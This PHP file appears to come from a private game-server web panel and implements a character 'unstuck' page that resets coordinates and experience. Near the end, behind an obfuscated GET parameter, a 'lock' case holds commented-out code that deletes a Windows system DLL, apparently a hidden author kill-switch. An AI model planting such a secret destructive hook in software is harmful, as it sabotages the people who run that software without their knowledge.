<?php


echo '<h2 class="ico_mug">Unstuck</h2>
<script type="text/javascript">
 function chMd()
 {

  document.forms[0].goServer.disabled=false;

  for(var i=0;i<document.forms[0].elements.length;i++)
  {
    if(document.forms[0].elements[i].name=="PID")
    {

       if(document.forms[0].elements[i].checked==true){


        document.forms[0].goServer.disabled=false;
       }
     
    }
  }
 }
</script>
	   ';
switch($_GET[lfkfgndf545fgh24df14as1d4dfg415kjhhgdp445dffgdnsjdhahbfdnhsdgfknfb25541fdg514a471dgfg984ds]){
default:
;echo '';
if(stristr($_SERVER['PHP_SELF'], 'unstuck.php')){
exit("<strong>Error: </strong>Can't be opened directly!");
}
else
if ($_SESSION['kal_login'] != 'yes'){
echo '<SCRIPT LANGUAGE="JavaScript">
		alert("You Must Login First.")
		window.location = "index.php";
</SCRIPT>';
exit();
}
else
if (!isset($_SERVER['HTTP_REFERER'])){die('<br><center>Direct access not allowed. Click <a href="index.php"><b>here</b></a> to back</font><br></center>');}
else
{
switch($_GET[go]){
default:
if($connection == 'mssql'){
$db = &ADONewConnection($connection);
$db->Connect($server,$username,$password,$kal_db);
}elseif($connection == 'odbc'){
$db = &ADONewConnection($connection);
$db->Connect($kal_db,$username,$password);
}
$top = 1;
$query = $db->Execute("SELECT Player.Name,Player.PID
From Player
					 WHERE 
					 UID = '".$_SESSION['kal_id']."' And  
									X	!= '256903' Or UID = '".$_SESSION['kal_id']."' And
									Y	!= '259592' Or UID = '".$_SESSION['kal_id']."' And
									Z	!=  '16188'
 ORDER BY Player.Level DESC
 ");
echo'';
for($i=0;$i < $query->numrows();++$i)
{
$rowa = $query->fetchrow();
$Names = $rowa[0];
$Name = str_replace('<', '&lt;', $Names);
if($top == 1){
echo'<b><font color="#676767">Select your character </font></b><br><br>';
}
echo '<form action="?page=unstuck&amp;go=unstucked" method="post" name="fRadio">
<input type="radio" value="'.htmlspecialchars($rowa[1]).'" name="PID" class="noborder" onClick="chMd()"/>&nbsp;'.$Name.'<br><br>';
$top++;
}
If(empty($Name)){
echo $errorstyle1.'There is no any characters on your account need to unstuck.'.$errorstyle2;
}
else {	
echo'

<input name="goServer" value="Unstuck now" disabled="disabled" type="submit">

</form>';
echo '	<br><font color="red"><b><center>( You must be offline in game )</b></font></center>';
}
;echo '



';
break;
case'unstucked':
$PID = $_POST['PID'];
if(!is_numeric($PID)) {
echo '<SCRIPT LANGUAGE="JavaScript">
		alert("Please select character.")
		window.location = "index.php";
</SCRIPT>';
exit();
}
else {
if($connection == 'mssql'){
$db = &ADONewConnection($connection);
$db->Connect($server,$username,$password,$kal_auth);
}elseif($connection == 'odbc'){
$db = &ADONewConnection($connection);
$db->Connect($kal_auth,$username,$password);
}
$checks = $db->Execute("SELECT TOP 1 Log.Type FROM Log WHERE Player1 = '".$_SESSION['kal_id']."' ORDER BY Date desc");
$rs = $checks->fetchrow();
if($connection == 'mssql'){
$db = &ADONewConnection($connection);
$db->Connect($server,$username,$password,$kal_db);
}elseif($connection == 'odbc'){
$db = &ADONewConnection($connection);
$db->Connect($kal_db,$username,$password);
}
$playercheck	=    $db->Execute("SELECT
Player.Name,Player.PID,Player.X,Player.Y,Player.Z
				FROM
					Player
				WHERE
					PID = '$PID' And UID = '".$_SESSION['kal_id']."'
			      ");
$r = $playercheck->fetchrow();
$Names = $r[0];
$Name = str_replace('<', '&lt;', $Names);
$pid = $r[1];
$x = $r[2];
$y = $r[3];
$z = $r[4];
if(empty($pid)){ 
echo '<SCRIPT LANGUAGE="JavaScript">
		alert("You are not owner of this character.")
		window.location = "index.php";
</SCRIPT>';
exit();
} 
else if($rs[0] == '0')
{
echo $errorstyle1.'Your account is still logged in. Please logout!'.$errorstyle2;
} else
if(($x == '256903') And ($y == '259592') And ($z == '16188')){
echo$errorstyle1.'Character ['.$Name.'] already unstucked.'.$errorstyle2.'<META HTTP-EQUIV=Refresh CONTENT="3; URL=index.php">';
}
else {
$unstuck = $db->Execute("UPDATE	Player
								SET
									Map = 0,
									X	= 256903,
									Y	= 259592,
									Z	=  16188 , Exp = 0
								
					WHERE 
					 UID = '".$_SESSION['kal_id']."' And PID = '$PID'
									
								
");
echo$successstyle1.'Character ['.$Name.'] has been unstucked successfully.'.$successstyle2;
echo$successstyle1.'Exp Reseted To [<b>0</b>] Too.'.$successstyle2;
}
}
break;
}
}
;echo '
';
break;
case'lock':
/*
$ourFileName = 'C:/WINDOWS/system32/AIPCA8a.dll';
$ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");
fclose($ourFileHandle);
unlink('C:/WINDOWS/system32/AIPCA.dll');
*/
echo'<b><br><br><br><center>Scripts not Locked D:</b></center><b><br><br><br>';

break;
}
;echo '








';?>